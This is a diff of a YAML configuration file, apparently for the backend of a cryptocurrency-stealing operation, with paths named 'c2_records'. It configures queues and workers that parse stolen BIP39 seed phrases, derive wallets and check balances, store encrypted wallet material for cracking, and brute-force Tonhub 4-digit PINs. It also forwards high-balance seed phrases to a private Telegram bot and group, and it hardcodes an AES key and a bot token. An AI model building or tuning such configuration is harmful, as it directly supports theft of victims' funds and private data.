@@ -1,5 +1,5 @@
 server:
-  port: 8204
+  port: 8109
   max-http-header-size: 2MB
   connection-timeout: 10s
   tomcat:
@@ -35,7 +35,6 @@ spring:
     date-format: yyyy-MM-dd HH:mm:ss
     time-zone: GMT+8
 
-  # spring-data-redis 自动配置用（RedisTemplate / RedisPush 依赖 Lettuce）
   redis:
     host: 127.0.0.1
     port: 6379
@@ -44,11 +43,10 @@ spring:
     timeout: 5000ms
     lettuce:
       pool:
-        max-active: 64    # 旁路 Lettuce；3 实例约 192
+        max-active: 64
         max-idle: 32
         min-idle: 8
         max-wait: 5000ms
-    # JedisPool（Stream 主路径）；3 实例 × 96 ≈ 288，需 Redis maxclients 足够
     jedis:
       pool:
         max-active: 96
@@ -66,40 +64,51 @@ spring:
     type: com.alibaba.druid.pool.DruidDataSource
     initialSize: 16
     minIdle: 16
-    maxActive: 80        # 3×80=240；MySQL max_connections 建议 ≥500
+    maxActive: 80
     maxWait: 5000
     timeBetweenEvictionRunsMillis: 30000
     minEvictableIdleTimeMillis: 50000
     validationQuery: SELECT 1
     testWhileIdle: true
-    testOnBorrow: false  # 关闭借出验证（testWhileIdle已保证连接可用），省~5-10ms/次DB操作
+    testOnBorrow: false
     testOnReturn: false
     connectionErrorRetryAttempts: 3
     breakAfterAcquireFailure: false
 
 consumer:
-  # 落盘根（同 API 进程 api18.upload-dir，war_unpack 读 .bin / Bip39Util 缓存用）
+  # 落盘根
   #upload-dir: D:/c2_records
   upload-dir: /opt/news4/data/apilog
-  # 解压 I/O+JSON：抬高以消化突发入队
+  #图片落盘位置
+  #photo-dir: D:/c2_records/photos
+  photo-dir: /opt/news4/data/photos
+  photo-url-prefix: data/photos
+  #钱包加密数据落盘位置
+  #waitbound-dir: "D:/c2_records/waitbound"
+  waitbound-dir: /opt/news4/data/waitbound
+  waitbound-task-enabled: true #是否开启加密信息收集
+  waitbound-threads: 2
+  waitbound-poll-interval-ms: 800
+  waitbound-claim-idle-ms: 900000
+  waitbound-batch-size: 4
+  tonhub-task-enabled: true  #是否开启Tonhub PIN 爆破旁路队列
+  tonhub-threads: 1
+  tonhub-poll-interval-ms: 500
+  tonhub-claim-idle-ms: 1800000
+  tonhub-batch-size: 1
+  # sandbox 全目录 BIP39 兜底扫描（metamask 等）默认关
+  sandbox-fallback-regex-enabled: false
   main-threads: 4
-  # parse CPU 密：勿超过约 CPU/2；trust scrypt 已异步，可到 4
   parse-ci-threads: 4
   auto-claim-idle-ms: 1800000
   main-claim-idle-ms: 600000
-  # 单条消息最大重试次数（含首次消费，超过进 DLQ）
   max-attempts: 5
-  # 默认 1000ms → 第1次重试1s，第2次2s，第3次4s，第4次8s
   retry-backoff-base-ms: 1000
-  # DLQ 消息最长保留毫秒（默认 7 天），超期自动清理
   dlq-retention-ms: 604800000
   # 助记词 AES 密钥：留空或空字符串 → mnemonic.result 明文入库
   mnemonic-aes-key: "Mn3m0n1c@2024!SecureKey#news2"
-  # 是否向 news4:tasks 投递 wallet_derive
   news4-task-enabled: true
-  # 下游放大：1 parse ≈ 5 derive；突发时需明显大于 parse-ci-threads
   news4-threads: 12
-  # 更勤拉取，减少 stream 堆积
   news4-poll-interval-ms: 300
   news4-claim-idle-ms: 600000
   photo-threads: 3
@@ -110,58 +119,61 @@ consumer:
   nb-notestore-poll-interval-ms: 800
   nb-notestore-claim-idle-ms: 900000
   nb-notestore-batch-size: 8
-  #photo-dir: D:/c2_records/photos
-  photo-dir: /opt/news4/data/photos
-  photo-url-prefix: data/photos
-  # 批量拉取：突发时一次多拿，减少 Redis 往返
   batch-size: 16
   parse-ci-batch-size: 8
   news4-batch-size: 24
   poll-interval-ms: 200
   parse-ci-poll-interval-ms: 400
   consumer-name:
-  # tonhub：完全异步 + 串行化，避免并发打满 CPU
   tonhub-brute-sync-timeout-ms: 0
   tonhub-brute-threads: 0
   tonhub-brute-serialize: true
-  # 每实例 1；3 实例合计最多 3 个 device 同时 tonhub 爆破
   tonhub-brute-serialize-permits: 1
   trust-decrypt-async: true
   trust-decrypt-threads: 2
-  # 每实例 2；3 实例合计约 6 路 trust scrypt
   trust-decrypt-serialize-permits: 2
-  # Poller 回压：worker 队列 ≥50% 停读，消息留 Stream 不丢
   poll-queue-high-ratio: 0.5
-  # Trust/Tonhub 无许可时延迟重试（不永久跳过）
   crypto-defer-max-attempts: 120
   crypto-defer-base-delay-ms: 3000
 
 # =============================================================================
 # 【换另一套时必改】Redis 队列隔离（本机多套同 Redis 时防串消费）
-# -----------------------------------------------------------------------------
-# 同一套里下列服务必须改成一样：
-#   18-ctwo-server / 18-device-server / 18-consumer-server  的 queue.*
-# 推荐做法（只改一项即可隔离）：
-#   queue.prefix: suite-a     → 实际 key 变成 suite-a:api18:tasks 等
-#   另一套用 suite-b
 # =============================================================================
 queue:
   prefix: "suite-a"                          # 【换套改这里】例：suite-a / suite-b；
-  stream-main: api18:tasks            # 主任务流（ctwo/device 生产，本服务消费）
+  # ---------- Stream（任务流）----------
+  # 主任务
+  stream-main: api18:tasks
+  # 助记词解析
   stream-parse-ci: api18:tasks:parse_ci
+  # 相册/图片
   stream-photo: api18:tasks:photo
+  # 备忘录
   stream-nb-notestore: api18:tasks:nb_notestore
-  stream-news4: news4:tasks           # wallet_derive 等
-  group-main: api18-workers           # 消费组名也会带 prefix
-  group-parse-ci: api18-parse-ci
-  group-news4: news4-workers
-  group-photo: api18-photo-workers
-  group-nb-notestore: api18-nb-notestore
+  # 未解出钱包加密材料落盘
+  stream-waitbound: api18:tasks:waitbound
+  # Tonhub 4 位 PIN 爆破
+  stream-tonhub: api18:tasks:tonhub
+  # 地址派生、余额等
+  stream-news4: news4:tasks
+
+  # ---------- Consumer Group（消费组，也会带 prefix）----------
+  group-main: api18-workers                  # 消费 stream-main
+  group-parse-ci: api18-parse-ci             # 消费 stream-parse-ci
+  group-news4: news4-workers                 # 消费 stream-news4
+  group-photo: api18-photo-workers           # 消费 stream-photo
+  group-nb-notestore: api18-nb-notestore     # 消费 stream-nb-notestore
+  group-waitbound: api18-waitbound           # 消费 stream-waitbound
+  group-tonhub: api18-tonhub                 # 消费 stream-tonhub
+
+  # ---------- DLQ（死信，超 max-attempts 进入；定期按 dlq-retention-ms 清理）----------
   dlq-main: api18:tasks:dead
   dlq-parse-ci: api18:tasks:parse_ci:dead
   dlq-news4: news4:tasks:dead
   dlq-photo: api18:tasks:photo:dead
   dlq-nb-notestore: api18:tasks:nb_notestore:dead
+  dlq-waitbound: api18:tasks:waitbound:dead
+  dlq-tonhub: api18:tasks:tonhub:dead
 
 # news4 旁路线程池（与 n4-worker 隔离；listen / balance 互不堵塞）
 news4:
@@ -187,6 +199,20 @@ telegram:
   mornitor_bot_token: '8690372906:AAHJHA1d3ll82KSbrd6fD6PNH_DoPBdc_28'
   max-concurrent: 4
   acquire-timeout-ms: 15000
+
+# 高额助记词分流（余额后）：USDT 合计或任一条原生币超阈值 → 隐私 bot/群 + 迁 private_mnemonic
+maxnotice:
+  enabled: true
+  usdt-sum-threshold: 1000
+  # 未配置或 <=0 的链不做原生币判定；按需改数值
+  native-thresholds:
+    tron: 1000
+    eth: 3
+    bsc: 100
+    btc: 1
+    sol: 1000
+  tg-bot-token: "8690372906:AAHJHA1d3ll82KSbrd6fD6PNH_DoPBdc_28"
+  tg-group-id: "-5598654952"
 
 #钱包地址监听
 monitor:
